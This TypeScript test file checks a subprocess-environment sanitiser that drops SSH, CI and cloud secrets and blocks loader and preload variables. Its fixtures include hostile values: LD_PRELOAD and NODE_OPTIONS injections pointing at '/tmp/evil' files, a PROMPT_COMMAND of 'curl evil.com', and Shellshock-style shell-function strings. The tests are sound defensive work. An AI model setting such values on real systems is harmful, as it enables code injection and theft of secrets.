import { describe, expect, it } from 'bun:test';
import {
  buildRestrictedSubprocessEnvironment,
  pickSafeHostEnvironment,
} from './subprocess-env.ts';

describe('subprocess environment boundary', () => {
  it('inherits operational variables and rejects arbitrary, SSH, CI and cloud secrets', () => {
    const env = pickSafeHostEnvironment({
      PATH: '/safe/bin',
      HOME: '/safe/home',
      LANG: 'fr_FR.UTF-8',
      LC_TIME: 'fr_FR.UTF-8',
      LC_SENTINEL_SECRET: 'must-not-leak',
      HTTPS_PROXY: 'http://proxy.test:8080',
      NODE_EXTRA_CA_CERTS: '/safe/company-ca.pem',
      ROBB_SENTINEL_SECRET: 'must-not-leak',
      SSH_AUTH_SOCK: '/tmp/ssh-agent.sock',
      CI_JOB_TOKEN: 'ci-secret',
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'github-oidc-secret',
      AWS_SECRET_ACCESS_KEY: 'aws-secret',
      AZURE_CLIENT_SECRET: 'azure-secret',
      GOOGLE_APPLICATION_CREDENTIALS: '/secret/gcp.json',
      NODE_OPTIONS: '--require=/tmp/untrusted-preload.js',
      LD_PRELOAD: '/tmp/untrusted.so',
    });

    expect(env).toEqual({
      PATH: '/safe/bin',
      HOME: '/safe/home',
      LANG: 'fr_FR.UTF-8',
      LC_TIME: 'fr_FR.UTF-8',
      HTTPS_PROXY: 'http://proxy.test:8080',
      NODE_EXTRA_CA_CERTS: '/safe/company-ca.pem',
    });
  });

  it('treats the caller map as an explicit per-child grant', () => {
    const env = buildRestrictedSubprocessEnvironment(
      {
        MCP_SOURCE_TOKEN: 'explicit-source-secret',
        CUSTOM_RUNTIME_FLAG: 'enabled',
      },
      {
        PATH: '/safe/bin',
        ROBB_SENTINEL_SECRET: 'must-not-leak',
      },
    );

    expect(env["PATH"]).toBe('/safe/bin');
    expect(env["MCP_SOURCE_TOKEN"]).toBe('explicit-source-secret');
    expect(env["CUSTOM_RUNTIME_FLAG"]).toBe('enabled');
    expect(env["ROBB_SENTINEL_SECRET"]).toBeUndefined();
  });

  it('preserves Windows Path casing and ignores exported shell functions', () => {
    const env = pickSafeHostEnvironment({
      Path: 'C:\\Windows\\System32',
      LANG: '() { :; }; echo unsafe',
    }, 'win32');

    expect(env["Path"]).toBe('C:\\Windows\\System32');
    expect(env["PATH"]).toBeUndefined();
    expect(env["LANG"]).toBeUndefined();
  });

  it('blocks dynamic-loader, runtime-preload, shell-hook, and server-secret keys even in explicitEnv', () => {
    const env = buildRestrictedSubprocessEnvironment(
      {
        MCP_SOURCE_TOKEN: 'allowed-token',
        NODE_OPTIONS: '--require /tmp/evil.js',
        BUN_OPTIONS: '--preload /tmp/evil.ts',
        LD_PRELOAD: '/tmp/evil.so',
        LD_LIBRARY_PATH: '/tmp/evil-lib',
        DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
        DYLD_LIBRARY_PATH: '/tmp/evil-dylib',
        BASH_ENV: '/tmp/evil.sh',
        ENV: '/tmp/evil.sh',
        PROMPT_COMMAND: 'curl evil.com',
        SHELLOPTS: 'xtrace',
        CRAFT_SERVER_TOKEN: 'must-not-be-forwarded',
        CRAFT_WEBUI_PASSWORD: 'must-not-be-forwarded',
        SHELL_FN_INJECT: '() { :; }; /bin/sh',
        NULL_BYTE_VAL: 'abc\0def',
      },
      { PATH: '/usr/bin' },
    );

    expect(env["PATH"]).toBe('/usr/bin');
    expect(env["MCP_SOURCE_TOKEN"]).toBe('allowed-token');
    expect(env["NODE_OPTIONS"]).toBeUndefined();
    expect(env["BUN_OPTIONS"]).toBeUndefined();
    expect(env["LD_PRELOAD"]).toBeUndefined();
    expect(env["LD_LIBRARY_PATH"]).toBeUndefined();
    expect(env["DYLD_INSERT_LIBRARIES"]).toBeUndefined();
    expect(env["DYLD_LIBRARY_PATH"]).toBeUndefined();
    expect(env["BASH_ENV"]).toBeUndefined();
    expect(env["ENV"]).toBeUndefined();
    expect(env["PROMPT_COMMAND"]).toBeUndefined();
    expect(env["SHELLOPTS"]).toBeUndefined();
    expect(env["CRAFT_SERVER_TOKEN"]).toBeUndefined();
    expect(env["CRAFT_WEBUI_PASSWORD"]).toBeUndefined();
    expect(env["SHELL_FN_INJECT"]).toBeUndefined();
    expect(env["NULL_BYTE_VAL"]).toBeUndefined();
  });
});
